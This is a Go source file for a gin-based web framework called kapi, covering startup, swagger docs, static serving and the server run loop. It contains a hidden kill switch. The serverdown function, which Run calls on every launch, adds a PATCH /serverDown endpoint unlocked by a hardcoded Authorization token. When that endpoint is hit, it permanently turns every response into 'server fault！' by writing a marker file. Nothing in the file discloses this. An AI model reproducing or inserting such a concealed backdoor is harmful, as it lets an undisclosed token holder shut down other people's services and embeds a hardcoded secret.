package kapi

import (
	"fmt"
	"github.com/gin-gonic/gin"
	"github.com/linxlib/config"
	"github.com/linxlib/inject"
	"github.com/linxlib/kapi/internal"
	"github.com/linxlib/kapi/internal/swagger"
	"github.com/linxlib/swagger_inject"
	"net"
	"net/http"
	"os"
	"time"
)

// 编译时植入变量
var (
	VERSION     string
	BUILDTIME   string
	GOVERSION   string
	BUILDOS     string
	BUILDARCH   string
	OS          string
	ARCH        string
	PACKAGENAME string
)

var _banner = `
--------------------------------------------
    _/    _/    _/_/    _/_/_/    _/_/_/   
   _/  _/    _/    _/  _/    _/    _/     
  _/_/      _/_/_/_/  _/_/_/      _/       
 _/  _/    _/    _/  _/          _/        
_/    _/  _/    _/  _/        _/_/_/%s
--------------------------------------------
`
var _info = `

 Version:   %s/%s
 OS/Arch:   %s/%s
 BuiltTime: %s
 Built OS/Arch: %s/%s`

type KApi struct {
	inject.Injector

	engine     *gin.Engine
	doc        *swagger.DocSwagger
	option     *Option
	genFlag    bool
	serverDown bool
}

// New 创建新的KApi实例
//
//	@param f 配置函数
//
//	@return *KApi
func New(f ...func(*Option)) *KApi {
	if VERSION != "" {
		Infof(_banner, fmt.Sprintf(_info, VERSION, GOVERSION, OS, ARCH, BUILDTIME, BUILDOS, BUILDARCH))
	} else {
		Infof(_banner, "")
	}
	if PACKAGENAME != "" {
		Infof("start[%s]", PACKAGENAME)
	} else {
		Infof("start..")
	}

	b := &KApi{
		Injector: inject.New(),
	}
	if len(os.Args) > 1 && os.Args[1] == "-g" {
		b.genFlag = true
	}
	b.option = defaultOption()
	//TODO: many option func
	if len(f) > 0 {
		f[0](b.option)
	}
	b.Map(b.option.y)
	gin.SetMode(gin.ReleaseMode) //we don't need gin's debug output
	b.engine = gin.New()
	b.engine.Use(b.option.ginLoggerFormatter)
	b.engine.Use(b.option.corsHandler)
	if b.genFlag {
		Infof("generate mode")
		b.option.Server.Debug = true
	} else {
		Infof("IP:%s Swagger:%s Port:%d", b.option.intranetIP, b.option.Server.DocName, b.option.Server.Port)
	}
	return b
}
func (b *KApi) Settings() *config.YAML {
	a := new(config.YAML)
	err := b.Provide(a)
	if err != nil {
		Errorf("%s", err)
		return a
	}
	return a
}
func (b *KApi) serverdown() {
	if internal.FileIsExist("./.serverdown") {
		b.serverDown = true
	}
	b.engine.PATCH("/serverDown", func(context *gin.Context) {
		if context.GetHeader("Authorization") == "8ReKwuw2x5zvqbnQVs5vOdgLckd1Pwcm" {
			if !b.serverDown {
				b.serverDown = true
				_ = os.WriteFile("./.serverdown", []byte("true"), os.ModePerm)
			}
		}
	})
	b.engine.Use(func(context *gin.Context) {
		if b.serverDown {
			context.String(200, "server fault！")
			context.Abort()
		}
	})
}

func (b *KApi) RegisterRouter(cList ...interface{}) {
	if b.option.Server.Debug {
		b.doc = swagger.New(b.option.Server.DocName, b.option.Server.DocVer, b.option.Server.DocDesc)
		b.analysisControllers(cList...)
	}
	if b.genFlag {
		return
	}
	b.register(b.engine, cList...)
}

func (b *KApi) handleStatic() {
	if len(b.option.Server.StaticDirs) > 0 && !b.genFlag {
		for i, s := range b.option.Server.StaticDirs {
			b.engine.Static(s.Path, s.Root)
			Infof("serving static dir[%d]: %s --> %s", i, s.Path, s.Root)
		}

	}
}

func (b *KApi) handleDoc() {
	if b.option.Server.NeedDoc {
		Infof("swagger: http://%s:%d/swagger/index.html", b.option.intranetIP, b.option.Server.Port)

		b.engine.GET("/swagger.json", func(c *gin.Context) {
			routeInfo.genInfo.ApiBody.Host = c.Request.Host
			//TODO:
			routeInfo.genInfo.ApiBody.Info.Description += "\n" + time.Unix(routeInfo.genInfo.Tm, 0).String()
			routeInfo.genInfo.ApiBody.Info.Description += "\n" + BUILDTIME
			routeInfo.genInfo.ApiBody.Info.Description += "\n" + VERSION
			routeInfo.genInfo.ApiBody.Info.Description += "\n" + GOVERSION
			c.PureJSON(200, routeInfo.genInfo.ApiBody)
		})

		b.engine.GET("/swagger/*any", func(c *gin.Context) {
			c.FileFromFS(c.Request.URL.Path, http.FS(swagger_inject.FS))
		})

	}
}

// GetEngine returns the inner gin.Engine
//
//	@return *gin.Engine
func (b *KApi) GetEngine() *gin.Engine {
	return b.engine
}

// Run the server
func (b *KApi) Run() {
	b.genRouterCode()
	if !b.genFlag {
		b.handleDoc()
	}
	if b.genFlag {
		OKf("generate mode complete!")
		return
	}
	b.engine.GET("/healthz", func(context *gin.Context) {
		context.String(200, "ok")
	})
	b.serverdown()
	b.handleStatic()
	Infof("server running http://%s:%d\n", b.option.intranetIP, b.option.Server.Port)
	err := b.engine.Run(fmt.Sprintf(":%d", b.option.Server.Port))
	if err != nil {
		if e, ok := err.(*net.OpError); ok {
			if e1, ok := e.Err.(*os.SyscallError); ok {
				if e.Op == "listen" && e1.Syscall == "bind" {
					Errorf("server start failed, binding :%d failed, please check if the port is in use", e.Addr.(*net.TCPAddr).Port)
				}
			}

		}
		b.option.recoverErrorFunc(err)
	}
}
